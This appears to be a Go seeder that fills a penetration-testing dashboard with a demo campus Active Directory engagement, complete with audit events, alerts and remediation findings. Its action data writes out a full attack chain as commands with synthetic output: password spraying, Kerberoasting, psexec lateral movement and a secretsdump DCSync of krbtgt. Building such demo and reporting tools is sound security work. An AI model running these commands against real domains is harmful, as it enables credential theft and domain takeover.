package server

import (
	"context"
	"database/sql"
	"fmt"
	"time"

	dbutil "waypoint/internal/db"
)

// SeedDemoEngagement fills a freshly provisioned engagement with a coherent,
// end-to-end penetration-test story so an evaluator can open the dashboard and
// see every surface populated with realistic data: actions across all three
// phases, discovered entities, a live audit trail, notable alerts, and promoted
// findings. It is invoked from the first-run bootstrap when the operator marks
// the instance as a demo, and it is safe to call only on an engagement that was
// just created (it appends; it does not reset).
//
// The narrative is a campus Active Directory assessment: recon maps the estate,
// attacks establish a foothold and escalate to Domain Admin via Kerberoasting,
// and the findings phase promotes the material issues with remediation.
func SeedDemoEngagement(ctx context.Context, db *sql.DB, engagementID, ownerID, ownerHandle string) error {
	if db == nil {
		return fmt.Errorf("demo seed: db is required")
	}
	store := newEvidenceStore()
	if err := store.ensureReady(ctx, db); err != nil {
		return fmt.Errorf("demo seed: evidence store: %w", err)
	}

	s := &demoSeeder{
		db:           db,
		store:        store,
		engagementID: engagementID,
		ownerID:      ownerID,
		ownerHandle:  ownerHandle,
		// Anchor the timeline in the recent past so the trail reads as a
		// multi-day engagement rather than a single burst.
		base: time.Now().UTC().Add(-3 * 24 * time.Hour),
	}
	return s.run(ctx)
}

type demoSeeder struct {
	db           *sql.DB
	store        *evidenceStore
	engagementID string
	ownerID      string
	ownerHandle  string
	base         time.Time

	operatorID string
	agentID    string
	entities   map[string]string // logical key -> entity id
}

func (s *demoSeeder) at(hoursIn float64) time.Time {
	return s.base.Add(time.Duration(hoursIn * float64(time.Hour)))
}

func (s *demoSeeder) run(ctx context.Context) error {
	tx, err := s.db.BeginTx(ctx, nil)
	if err != nil {
		return fmt.Errorf("demo seed: begin: %w", err)
	}
	defer tx.Rollback()

	if err := s.seedActors(ctx, tx); err != nil {
		return err
	}
	if err := s.seedEntities(ctx, tx); err != nil {
		return err
	}
	if err := s.seedActions(ctx, tx); err != nil {
		return err
	}
	if err := tx.Commit(); err != nil {
		return fmt.Errorf("demo seed: commit: %w", err)
	}
	return nil
}

// seedActors adds the two supporting actors the story needs beyond the owner:
// a second human operator and an AI recon agent the owner authorized. Together
// with the owner they exercise the human/AI attribution the audit trail shows.
func (s *demoSeeder) seedActors(ctx context.Context, tx *sql.Tx) error {
	operatorID, err := insertDemoHuman(ctx, tx, s.engagementID, "sam.rivera", "operator")
	if err != nil {
		return fmt.Errorf("demo seed: operator: %w", err)
	}
	s.operatorID = operatorID

	var agentID string
	if err := tx.QueryRowContext(ctx, `
		INSERT INTO actor (engagement_id, kind, handle, token_hash, role, agent_name, model, version, authorized_by, credential_version, revision)
		VALUES ($1, 'ai_agent', 'recon-scout', $2, 'operator', 'recon-scout', 'claude-fable-5', '1.4.0', $3, 1, 1)
		RETURNING id`, s.engagementID, sha256Hex("waypoint:demo:recon-scout:"+s.engagementID), s.ownerID).Scan(&agentID); err != nil {
		return fmt.Errorf("demo seed: agent: %w", err)
	}
	s.agentID = agentID

	if _, err := dbutil.AppendAuditEvent(ctx, tx, dbutil.AuditEventInput{
		EngagementID: s.engagementID,
		Type:         "actor.provisioned",
		Actor:        s.human(s.operatorID, "sam.rivera", "operator"),
		Origin:       dbutil.AuditOrigin{Kind: "rest"},
		Subject:      dbutil.AuditSubject{Type: "actor", ID: s.operatorID, Revision: 1},
		RequestID:    "demo-seed",
		CorrelationID: "demo-seed",
		Data:         map[string]any{"actorId": s.operatorID, "kind": "human", "role": "operator"},
	}); err != nil {
		return fmt.Errorf("demo seed: operator audit: %w", err)
	}
	if _, err := dbutil.AppendAuditEvent(ctx, tx, dbutil.AuditEventInput{
		EngagementID: s.engagementID,
		Type:         "actor.provisioned",
		Actor: dbutil.AuditActorSnapshot{
			ID: s.agentID, Kind: "ai_agent", Handle: "recon-scout", Role: "operator",
			AgentName: "recon-scout", Model: "claude-fable-5", Version: "1.4.0", AuthorizedBy: s.ownerID,
		},
		Origin:        dbutil.AuditOrigin{Kind: "rest"},
		Subject:       dbutil.AuditSubject{Type: "actor", ID: s.agentID, Revision: 1},
		RequestID:     "demo-seed",
		CorrelationID: "demo-seed",
		Data:          map[string]any{"actorId": s.agentID, "kind": "ai_agent", "role": "operator", "authorizedBy": s.ownerID, "model": "claude-fable-5"},
	}); err != nil {
		return fmt.Errorf("demo seed: agent audit: %w", err)
	}
	return nil
}

func (s *demoSeeder) human(id, handle, role string) dbutil.AuditActorSnapshot {
	return dbutil.AuditActorSnapshot{ID: id, Kind: "human", Handle: handle, Role: role}
}

func (s *demoSeeder) aiAgent() dbutil.AuditActorSnapshot {
	return dbutil.AuditActorSnapshot{
		ID: s.agentID, Kind: "ai_agent", Handle: "recon-scout", Role: "operator",
		AgentName: "recon-scout", Model: "claude-fable-5", Version: "1.4.0", AuthorizedBy: s.ownerID,
	}
}

// seedEntities lays down the estate the actions discover: the gateway, the
// domain controller, an internet-facing portal, an internal file share, a lab
// workstation, and the service account that Kerberoasting cracks.
func (s *demoSeeder) seedEntities(ctx context.Context, tx *sql.Tx) error {
	s.entities = map[string]string{}
	specs := []struct {
		key      string
		kind     string
		keyType  string
		keyValue string
		attrs    map[string]any
	}{
		{"gw", "host", "fqdn", "gw-01.campus.example.edu", map[string]any{"ip": "10.4.0.1", "role": "edge-gateway", "os": "VyOS 1.4"}},
		{"dc", "host", "fqdn", "dc-01.campus.example.edu", map[string]any{"ip": "10.4.10.10", "role": "domain-controller", "os": "Windows Server 2019", "domain": "CAMPUS.EXAMPLE.EDU"}},
		{"portal", "host", "fqdn", "portal.campus.example.edu", map[string]any{"ip": "10.4.20.15", "role": "student-portal", "os": "Ubuntu 22.04", "exposure": "internet"}},
		{"fileshare", "host", "hostname_ip", "hostname=fileshare-01|ip=10.4.20.40", map[string]any{"ip": "10.4.20.40", "role": "file-server", "os": "Windows Server 2016"}},
		{"workstation", "host", "hostname_ip", "hostname=ws-lab-88|ip=10.4.30.88", map[string]any{"ip": "10.4.30.88", "role": "lab-workstation", "os": "Windows 10"}},
		{"svc_backup", "identity", "ad_sid", "S-1-5-21-1004336348-1177238915-682003330-1109", map[string]any{"sam": "svc_backup", "type": "service-account", "spn": "MSSQLSvc/dc-01.campus.example.edu:1433", "memberOf": "Domain Admins"}},
		{"jdoe", "identity", "ad_sid", "S-1-5-21-1004336348-1177238915-682003330-1423", map[string]any{"sam": "jdoe", "type": "student", "memberOf": "Students"}},
	}
	for _, spec := range specs {
		id, err := upsertEntity(ctx, tx, s.engagementID, spec.kind, spec.keyType, spec.keyValue, spec.attrs)
		if err != nil {
			return fmt.Errorf("demo seed: entity %s: %w", spec.key, err)
		}
		s.entities[spec.key] = id
	}
	return nil
}

// demoAction is the variable surface of a synthetic action; the seeder fills in
// the invariant attribution fields (evidence, execution shape, provenance) so
// every row satisfies the action table's constraints by construction.
type demoAction struct {
	hoursIn     float64
	durationSec int
	actor       dbutil.AuditActorSnapshot
	sourceKind  string // source_agent_kind
	initiatedBy string // manual | ai
	phase       string // recon | attacks | findings
	command     string
	argv        []string
	targetKind  string
	targetValue string
	targetPort  *int
	execHostIP  string
	egressIP    string // when set, egress is 'auto'/'observed'; otherwise 'off'
	exitCode    int
	stdout      string
	stderr      string
	pluginID    string // set => parse_status 'parsed'
	rationale   string // set on AI actions => decision_context
	pivot       []map[string]any
	// observations link discovered entities to this action's structured result.
	observations []demoObservation
}

type demoObservation struct {
	entityKey   string
	kind        string
	identifiers []map[string]any
	attributes  map[string]any
}

func port(p int) *int { return &p }

func (s *demoSeeder) seedActions(ctx context.Context, tx *sql.Tx) error {
	actions := s.actionScript()
	// Keep a handle on attack actions so findings can cite them as evidence.
	attackAction := map[string]string{}
	for i := range actions {
		a := actions[i]
		id, err := s.insertAction(ctx, tx, a)
		if err != nil {
			return fmt.Errorf("demo seed: action %q: %w", a.command, err)
		}
		if a.phase == "attacks" {
			attackAction[a.command] = id
		}
	}
	if err := s.seedNotableAlerts(ctx, tx); err != nil {
		return err
	}
	return s.seedFindings(ctx, tx, attackAction)
}

func (s *demoSeeder) actionScript() []demoAction {
	op := s.human(s.operatorID, "sam.rivera", "operator")
	owner := s.human(s.ownerID, s.ownerHandle, "owner")
	ai := s.aiAgent()

	return []demoAction{
		// ---- Recon ---------------------------------------------------------
		{
			hoursIn: 0.2, durationSec: 34, actor: op, sourceKind: "operator_wrapper", initiatedBy: "manual", phase: "recon",
			command: "nmap", argv: []string{"nmap", "-sn", "10.4.0.0/16"},
			targetKind: "cidr", targetValue: "10.4.0.0/16", execHostIP: "10.4.30.20", egressIP: "203.0.113.24", exitCode: 0,
			stdout: "Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for gw-01.campus.example.edu (10.4.0.1)\nHost is up (0.0021s latency).\nNmap scan report for dc-01.campus.example.edu (10.4.10.10)\nHost is up (0.0009s latency).\nNmap scan report for portal.campus.example.edu (10.4.20.15)\nHost is up (0.0015s latency).\nNmap scan report for fileshare-01 (10.4.20.40)\nHost is up (0.0011s latency).\nNmap scan report for ws-lab-88 (10.4.30.88)\nHost is up (0.0031s latency).\nNmap done: 65536 IP addresses (5 hosts up) scanned in 33.72 seconds\n",
			pluginID: "nmap-host-discovery",
			observations: []demoObservation{
				{entityKey: "gw", kind: "host", identifiers: []map[string]any{{"type": "fqdn", "value": "gw-01.campus.example.edu"}}, attributes: map[string]any{"ip": "10.4.0.1", "state": "up"}},
				{entityKey: "dc", kind: "host", identifiers: []map[string]any{{"type": "fqdn", "value": "dc-01.campus.example.edu"}}, attributes: map[string]any{"ip": "10.4.10.10", "state": "up"}},
				{entityKey: "portal", kind: "host", identifiers: []map[string]any{{"type": "fqdn", "value": "portal.campus.example.edu"}}, attributes: map[string]any{"ip": "10.4.20.15", "state": "up"}},
				{entityKey: "fileshare", kind: "host", identifiers: []map[string]any{{"type": "hostname", "value": "fileshare-01"}, {"type": "ip", "value": "10.4.20.40"}}, attributes: map[string]any{"state": "up"}},
			},
		},
		{
			hoursIn: 0.9, durationSec: 71, actor: op, sourceKind: "operator_wrapper", initiatedBy: "manual", phase: "recon",
			command: "nmap", argv: []string{"nmap", "-sV", "-p-", "10.4.10.10"},
			targetKind: "host", targetValue: "10.4.10.10", targetPort: port(389), execHostIP: "10.4.30.20", egressIP: "203.0.113.24", exitCode: 0,
			stdout: "Nmap scan report for dc-01.campus.example.edu (10.4.10.10)\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos\n135/tcp  open  msrpc         Microsoft Windows RPC\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP\n445/tcp  open  microsoft-ds  Windows Server 2019\n636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Global Catalog)\nService Info: Host: DC-01; OS: Windows Server 2019\n",
			pluginID: "nmap-service-scan",
			observations: []demoObservation{
				{entityKey: "dc", kind: "service", identifiers: []map[string]any{{"type": "fqdn", "value": "dc-01.campus.example.edu"}}, attributes: map[string]any{"services": []string{"kerberos", "ldap", "smb", "ldaps", "global-catalog"}, "os": "Windows Server 2019"}},
			},
		},
		{
			hoursIn: 1.6, durationSec: 12, actor: ai, sourceKind: "remote_agent", initiatedBy: "ai", phase: "recon",
			command: "dig", argv: []string{"dig", "AXFR", "campus.example.edu", "@10.4.10.10"},
			targetKind: "host", targetValue: "10.4.10.10", targetPort: port(53), execHostIP: "10.4.30.21", exitCode: 0,
			rationale: "Enumerate DNS records to map internal services before active testing.",
			stdout: "; <<>> DiG 9.18.24 <<>> AXFR campus.example.edu @10.4.10.10\ncampus.example.edu.      3600 IN SOA dc-01.campus.example.edu. hostmaster. 42 3600 600 86400 3600\ndc-01.campus.example.edu. 3600 IN A 10.4.10.10\nportal.campus.example.edu. 3600 IN A 10.4.20.15\nfileshare-01.campus.example.edu. 3600 IN A 10.4.20.40\nvpn.campus.example.edu.  3600 IN A 10.4.0.9\n; Transfer failed after 4 records — server refused remaining zone.\n",
			stderr:   ";; Connection to 10.4.10.10#53 for campus.example.edu failed: partial transfer.\n",
			pluginID: "dns-zone-transfer",
			observations: []demoObservation{
				{entityKey: "portal", kind: "dns-record", identifiers: []map[string]any{{"type": "fqdn", "value": "portal.campus.example.edu"}}, attributes: map[string]any{"record": "A", "ip": "10.4.20.15"}},
			},
		},
		{
			hoursIn: 2.4, durationSec: 8, actor: op, sourceKind: "operator_wrapper", initiatedBy: "manual", phase: "recon",
			command: "crackmapexec", argv: []string{"crackmapexec", "smb", "10.4.20.40", "--shares"},
			targetKind: "host", targetValue: "10.4.20.40", targetPort: port(445), execHostIP: "10.4.30.20", exitCode: 0,
			stdout: "SMB  10.4.20.40  445  FILESHARE-01  [*] Windows Server 2016 Build 14393 (name:FILESHARE-01) (domain:CAMPUS)\nSMB  10.4.20.40  445  FILESHARE-01  [+] Enumerated shares\nSMB  10.4.20.40  445  FILESHARE-01  Share      Permissions  Remark\nSMB  10.4.20.40  445  FILESHARE-01  -----      -----------  ------\nSMB  10.4.20.40  445  FILESHARE-01  IPC$                    Remote IPC\nSMB  10.4.20.40  445  FILESHARE-01  Departments  READ        \nSMB  10.4.20.40  445  FILESHARE-01  Backups                 SMB signing: False\n",
			pluginID: "smb-enum",
			observations: []demoObservation{
				{entityKey: "fileshare", kind: "service", identifiers: []map[string]any{{"type": "hostname", "value": "fileshare-01"}, {"type": "ip", "value": "10.4.20.40"}}, attributes: map[string]any{"shares": []string{"Departments", "Backups"}, "smbSigning": false}},
			},
		},

		// ---- Attacks -------------------------------------------------------
		{
			hoursIn: 20.0, durationSec: 46, actor: op, sourceKind: "operator_wrapper", initiatedBy: "manual", phase: "attacks",
			command: "password-spray", argv: []string{"kerbrute", "passwordspray", "-d", "campus.example.edu", "users.txt", "Spring2026!"},
			targetKind: "host", targetValue: "portal.campus.example.edu", targetPort: port(443), execHostIP: "10.4.30.20", egressIP: "203.0.113.24", exitCode: 0,
			stdout: "2026/... >  Using KDC(s): dc-01.campus.example.edu:88\n2026/... >  [+] VALID LOGIN:  jdoe@campus.example.edu:Spring2026!\n2026/... >  Done! Tested 812 logins (1 success) in 45.9 seconds\n",
			pluginID: "kerbrute-spray",
			observations: []demoObservation{
				{entityKey: "jdoe", kind: "credential", identifiers: []map[string]any{{"type": "ad_sid", "value": "S-1-5-21-1004336348-1177238915-682003330-1423"}}, attributes: map[string]any{"success": true, "user": "jdoe", "target": "portal.campus.example.edu", "method": "kerberos-preauth"}},
			},
		},
		{
			hoursIn: 22.5, durationSec: 19, actor: ai, sourceKind: "remote_agent", initiatedBy: "ai", phase: "attacks",
			command: "kerberoast", argv: []string{"GetUserSPNs.py", "campus.example.edu/jdoe", "-request", "-dc-ip", "10.4.10.10"},
			targetKind: "host", targetValue: "10.4.10.10", targetPort: port(88), execHostIP: "10.4.30.21", exitCode: 0,
			rationale:       "Foothold account jdoe can request service tickets; roast SPNs to recover a privileged hash offline.",
			pivot:           []map[string]any{{"type": "credential", "host": "portal.campus.example.edu", "label": "jdoe@campus"}},
			stdout: "ServicePrincipalName                          Name        MemberOf                 \n--------------------------------------------  ----------  ------------------------\nMSSQLSvc/dc-01.campus.example.edu:1433        svc_backup  CN=Domain Admins,...     \n[+] $krb5tgs$23$*svc_backup$CAMPUS.EXAMPLE.EDU$MSSQLSvc/...$ (hash captured, 4.1 KB)\n[+] hashcat -m 13100 confirmed: svc_backup:Summer#Backup#2025\n",
			pluginID: "kerberoast",
			observations: []demoObservation{
				{entityKey: "svc_backup", kind: "credential", identifiers: []map[string]any{{"type": "ad_sid", "value": "S-1-5-21-1004336348-1177238915-682003330-1109"}}, attributes: map[string]any{"success": true, "user": "svc_backup", "target": "dc-01.campus.example.edu", "method": "kerberoast", "privilege": "Domain Admins"}},
			},
		},
		{
			hoursIn: 24.0, durationSec: 15, actor: op, sourceKind: "operator_wrapper", initiatedBy: "manual", phase: "attacks",
			command: "smb-exec", argv: []string{"psexec.py", "campus.example.edu/svc_backup@10.4.20.40"},
			targetKind: "host", targetValue: "10.4.20.40", targetPort: port(445), execHostIP: "10.4.30.20", exitCode: 0,
			pivot:  []map[string]any{{"type": "credential", "host": "dc-01.campus.example.edu", "label": "svc_backup (Domain Admin)"}},
			stdout: "[*] Requesting shares on 10.4.20.40.....\n[*] Found writable share ADMIN$\n[*] Uploading file mSVcPlPk.exe\n[*] Opening SVCManager on 10.4.20.40.....\n[*] Creating service tGLc on 10.4.20.40.....\nC:\\Windows\\system32> whoami\ncampus\\svc_backup\n",
			pluginID: "smb-exec",
			observations: []demoObservation{
				{entityKey: "fileshare", kind: "access", identifiers: []map[string]any{{"type": "hostname", "value": "fileshare-01"}, {"type": "ip", "value": "10.4.20.40"}}, attributes: map[string]any{"success": true, "user": "svc_backup", "target": "fileshare-01", "access": "SYSTEM", "segment": "10.4.20.0/24"}},
			},
		},
		{
			hoursIn: 25.2, durationSec: 6, actor: owner, sourceKind: "operator_wrapper", initiatedBy: "manual", phase: "attacks",
			command: "loot-dump", argv: []string{"secretsdump.py", "-just-dc-user", "krbtgt", "campus.example.edu/svc_backup@10.4.10.10"},
			targetKind: "host", targetValue: "10.4.10.10", targetPort: port(445), execHostIP: "10.4.30.20", exitCode: 0,
			pivot:  []map[string]any{{"type": "credential", "host": "fileshare-01", "label": "svc_backup"}},
			stdout: "[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:6f9d[...redacted...]:::\n[*] Cleaning up...\n",
			pluginID: "secretsdump",
			observations: []demoObservation{
				{entityKey: "dc", kind: "credential", identifiers: []map[string]any{{"type": "fqdn", "value": "dc-01.campus.example.edu"}}, attributes: map[string]any{"success": true, "user": "krbtgt", "target": "dc-01.campus.example.edu", "method": "dcsync", "impact": "golden-ticket-capable"}},
			},
		},

		// ---- Findings phase (verification / evidence collection) -----------
		{
			hoursIn: 40.0, durationSec: 4, actor: op, sourceKind: "operator_wrapper", initiatedBy: "manual", phase: "findings",
			command: "verify", argv: []string{"ldapsearch", "-x", "-H", "ldap://10.4.10.10", "-b", "CN=svc_backup,...", "memberOf"},
			targetKind: "host", targetValue: "10.4.10.10", targetPort: port(389), execHostIP: "10.4.30.20", exitCode: 0,
			stdout:   "memberOf: CN=Domain Admins,CN=Users,DC=campus,DC=example,DC=edu\n# svc_backup confirmed member of Domain Admins — finding evidence retained.\n",
			pluginID: "ldap-verify",
		},
	}
}

// insertAction persists one synthetic action with all attribution fields set so
// the action table's shape constraints hold, writes its stdout/stderr evidence
// blobs, records any structured result + observations, and appends the
// capture.accepted audit event that puts it on the journey log.
func (s *demoSeeder) insertAction(ctx context.Context, tx *sql.Tx, a demoAction) (string, error) {
	started := s.at(a.hoursIn)
	ended := started.Add(time.Duration(a.durationSec) * time.Second)

	stdoutSHA, stdoutLen, err := s.store.writeBlob("stdout", []byte(a.stdout))
	if err != nil {
		return "", fmt.Errorf("stdout blob: %w", err)
	}
	stderrSHA, stderrLen, err := s.store.writeBlob("stderr", []byte(a.stderr))
	if err != nil {
		return "", fmt.Errorf("stderr blob: %w", err)
	}
	stdoutID, err := upsertEvidence(ctx, tx, s.engagementID, "stdout", "text/plain; charset=utf-8", stdoutSHA, stdoutLen)
	if err != nil {
		return "", fmt.Errorf("stdout evidence: %w", err)
	}
	stderrID, err := upsertEvidence(ctx, tx, s.engagementID, "stderr", "text/plain; charset=utf-8", stderrSHA, stderrLen)
	if err != nil {
		return "", fmt.Errorf("stderr evidence: %w", err)
	}

	captureID := newUUID()
	fingerprint := sha256Hex("demo:" + captureID + ":" + a.command)
	actionID := newUUID()

	parseStatus := "raw"
	var pluginArg any
	if a.pluginID != "" {
		parseStatus = "parsed"
		pluginArg = a.pluginID
	}

	// Egress shape: an observed public IP means an auto/observed egress; its
	// absence means egress was disabled for this internal action.
	var egressIPArg, egressObservedArg any
	egressMode, egressStatus := "off", "disabled"
	if a.egressIP != "" {
		egressMode, egressStatus = "auto", "observed"
		egressIPArg = a.egressIP
		egressObservedArg = ended
	}

	var decisionArg any
	if a.initiatedBy == "ai" {
		decisionArg = mustJSON(map[string]any{"rationale": a.rationale, "authorizationReference": "engagement-" + s.engagementID})
	}

	pivot := a.pivot
	if pivot == nil {
		pivot = []map[string]any{}
	}

	if _, err := tx.ExecContext(ctx, `
		INSERT INTO action (
			id, engagement_id, actor_id, source_agent_id, source_agent_kind, source_agent_name, source_agent_version, source_agent_platform_os, source_agent_platform_arch,
			capture_id, capture_fingerprint, initiated_by, phase, command, argv, cwd,
			exec_host_ip, exec_host_method, exec_host_confidence,
			egress_public_ip, egress_mode, egress_status, egress_observed_at, pivot_chain, target_kind, target_value, target_port,
			started_at, ended_at, execution_status, exit_code,
			received_at, clock_skew_status, clock_skew_offset_ms, stdout_evidence_id, stderr_evidence_id, plugin_id, parse_status, decision_context
		) VALUES (
			$1, $2, $3, $4, $5, $6, $7, $8, $9,
			$10, $11, $12, $13, $14, $15::jsonb, $16,
			$17::inet, 'route_selection', 'confirmed',
			$18::inet, $19, $20, $21, $22::jsonb, $23, $24, $25,
			$26, $27, 'exited', $28,
			$27, 'within_tolerance', 0, $29, $30, $31, $32, $33::jsonb
		)`,
		actionID, s.engagementID, a.actor.ID, a.actor.ID, a.sourceKind, "waypoint-capture", "1.4.0", "linux", "amd64",
		captureID, fingerprint, a.initiatedBy, a.phase, a.command, mustJSON(a.argv), "/root/engagement",
		a.execHostIP,
		egressIPArg, egressMode, egressStatus, egressObservedArg, mustJSON(pivot), a.targetKind, a.targetValue, targetPortValue(a.targetPort),
		started, ended, a.exitCode,
		stdoutID, stderrID, pluginArg, parseStatus, decisionArg,
	); err != nil {
		return "", err
	}

	if a.pluginID != "" {
		if err := s.insertResult(ctx, tx, actionID, a); err != nil {
			return "", err
		}
	}

	if _, err := dbutil.AppendAuditEvent(ctx, tx, dbutil.AuditEventInput{
		EngagementID:  s.engagementID,
		Type:          "capture.accepted",
		Actor:         a.actor,
		Origin:        dbutil.AuditOrigin{Kind: "rest"},
		Subject:       dbutil.AuditSubject{Type: "action", ID: actionID, Revision: 1},
		RequestID:     "demo-seed",
		CorrelationID: captureID,
		Data: map[string]any{
			"actionId": actionID, "captureId": captureID, "phase": a.phase, "initiatedBy": a.initiatedBy,
			"command": a.command, "target": map[string]any{"kind": a.targetKind, "value": a.targetValue},
			"parseStatus": parseStatus,
		},
	}); err != nil {
		return "", err
	}
	return actionID, nil
}

func (s *demoSeeder) insertResult(ctx context.Context, tx *sql.Tx, actionID string, a demoAction) error {
	resultID := newUUID()
	extracted := map[string]any{"summary": a.command + " completed", "records": len(a.observations)}
	if _, err := tx.ExecContext(ctx, `
		INSERT INTO result (id, engagement_id, action_id, plugin_id, schema_id, schema_version, extracted)
		VALUES ($1, $2, $3, $4, $5, $6, $7::jsonb)`,
		resultID, s.engagementID, actionID, a.pluginID, a.pluginID+"-result", "1.0.0", mustJSON(extracted)); err != nil {
		return fmt.Errorf("insert result: %w", err)
	}
	for _, obs := range a.observations {
		entityID := s.entities[obs.entityKey]
		if entityID == "" {
			continue
		}
		if _, err := tx.ExecContext(ctx, `
			INSERT INTO observation (engagement_id, action_id, result_id, entity_id, kind, identifiers, attributes)
			VALUES ($1, $2, $3, $4, $5, $6::jsonb, $7::jsonb)`,
			s.engagementID, actionID, resultID, entityID, obs.kind, mustJSON(obs.identifiers), mustJSON(obs.attributes)); err != nil {
			return fmt.Errorf("insert observation: %w", err)
		}
	}
	return nil
}

// seedNotableAlerts records the two alerts a real engagement would surface: the
// spray that yielded a valid login, and the Domain Admin credential recovered by
// Kerberoasting. They are stored as the same alert.notable audit events the live
// notable-alerts rule engine emits.
func (s *demoSeeder) seedNotableAlerts(ctx context.Context, tx *sql.Tx) error {
	alertActor, err := notableAlertActor(ctx, tx, s.engagementID)
	if err != nil {
		return fmt.Errorf("demo seed: alert actor: %w", err)
	}
	alerts := []struct {
		ruleID, ruleTitle, dedupe string
		match                     map[string]any
	}{
		{"successful-auth", "Successful authentication", "successful-auth|jdoe|portal.campus.example.edu|kerberos-preauth",
			map[string]any{"success": true, "user": "jdoe", "target": "portal.campus.example.edu", "method": "kerberos-preauth"}},
		{"successful-auth", "Successful authentication", "successful-auth|svc_backup|dc-01.campus.example.edu|kerberoast",
			map[string]any{"success": true, "user": "svc_backup", "target": "dc-01.campus.example.edu", "method": "kerberoast", "privilege": "Domain Admins"}},
	}
	for _, al := range alerts {
		if _, err := dbutil.AppendAuditEvent(ctx, tx, dbutil.AuditEventInput{
			EngagementID:  s.engagementID,
			Type:          "alert.notable",
			Actor:         auditActorSnapshot(alertActor),
			Origin:        dbutil.AuditOrigin{Kind: "service", Service: "notable-alerts"},
			Subject:       dbutil.AuditSubject{Type: "engagement", ID: s.engagementID, Revision: 1},
			RequestID:     "demo-seed",
			CorrelationID: "demo-seed",
			Data: map[string]any{
				"ruleId": al.ruleID, "ruleTitle": al.ruleTitle, "dedupeKey": al.dedupe, "match": al.match,
			},
		}); err != nil {
			return fmt.Errorf("demo seed: alert %s: %w", al.dedupe, err)
		}
	}
	return nil
}

// seedFindings promotes the material issues, each citing an attack action as
// evidence and the entities it affected — the same shape the findings API
// produces when an operator promotes an action.
func (s *demoSeeder) seedFindings(ctx context.Context, tx *sql.Tx, attackAction map[string]string) error {
	owner := s.human(s.ownerID, s.ownerHandle, "owner")
	findings := []struct {
		title       string
		severity    string
		status      string
		sourceCmd   string
		entityKeys  []string
		remediation string
	}{
		{
			"Kerberoastable service account holds Domain Admin", "critical", "confirmed", "kerberoast",
			[]string{"svc_backup", "dc"},
			"Remove svc_backup from Domain Admins and run it under a group Managed Service Account (gMSA). Rotate its password to 25+ random characters and set the account to require AES-only Kerberos. Audit all SPN-bearing accounts for excessive privilege.",
		},
		{
			"Password spray succeeded against the student portal", "high", "confirmed", "password-spray",
			[]string{"jdoe", "portal"},
			"Enforce an account-lockout / smart-lockout policy at the KDC and portal, ban seasonal passwords (Spring2026!) via a banned-password list, and require MFA on the portal. Alert on >10 pre-auth failures per source in 5 minutes.",
		},
		{
			"SMB signing not required on file server enables relay", "medium", "confirmed", "smb-exec",
			[]string{"fileshare"},
			"Enable and require SMB signing via GPO (Microsoft network server: Digitally sign communications = Always) on fileshare-01 and all servers. Disable NTLM where possible and restrict administrative shares.",
		},
	}
	for _, f := range findings {
		actionID := attackAction[f.sourceCmd]
		if actionID == "" {
			continue
		}
		affected := make([]string, 0, len(f.entityKeys))
		for _, k := range f.entityKeys {
			if id := s.entities[k]; id != "" {
				affected = append(affected, id)
			}
		}
		findingID := newUUID()
		now := s.at(44)
		if _, err := tx.ExecContext(ctx, `
			INSERT INTO finding (id, engagement_id, title, severity, affected_entity_ids, evidence_action_ids, remediation, status, promoted_by, promoted_at, revision, created_at, updated_at)
			VALUES ($1, $2, $3, $4, $5::uuid[], $6::uuid[], $7, $8, $9, $10, 1, $10, $10)`,
			findingID, s.engagementID, f.title, f.severity, uuidArrayLiteral(affected), uuidArrayLiteral([]string{actionID}), f.remediation, f.status, s.ownerID, now); err != nil {
			return fmt.Errorf("demo seed: finding %q: %w", f.title, err)
		}
		if _, err := dbutil.AppendAuditEvent(ctx, tx, dbutil.AuditEventInput{
			EngagementID:  s.engagementID,
			Type:          "finding.promoted",
			Actor:         owner,
			Origin:        dbutil.AuditOrigin{Kind: "rest"},
			Subject:       dbutil.AuditSubject{Type: "finding", ID: findingID, Revision: 1},
			RequestID:     "demo-seed",
			CorrelationID: "demo-seed",
			Data: map[string]any{
				"sourceActionId": actionID, "title": f.title, "severity": f.severity, "status": f.status,
				"affectedEntityIds": affected, "evidenceActionIds": []string{actionID},
			},
		}); err != nil {
			return fmt.Errorf("demo seed: finding audit %q: %w", f.title, err)
		}
	}
	return nil
}

// insertDemoHuman creates a supporting human actor with a deterministic,
// unusable token digest (the demo never signs in as these actors).
func insertDemoHuman(ctx context.Context, tx *sql.Tx, engagementID, handle, role string) (string, error) {
	var id string
	err := tx.QueryRowContext(ctx, `
		INSERT INTO actor (engagement_id, kind, handle, token_hash, role, credential_version, revision)
		VALUES ($1, 'human', $2, $3, $4, 1, 1)
		RETURNING id`, engagementID, handle, sha256Hex("waypoint:demo:"+handle+":"+engagementID), role).Scan(&id)
	return id, err
}
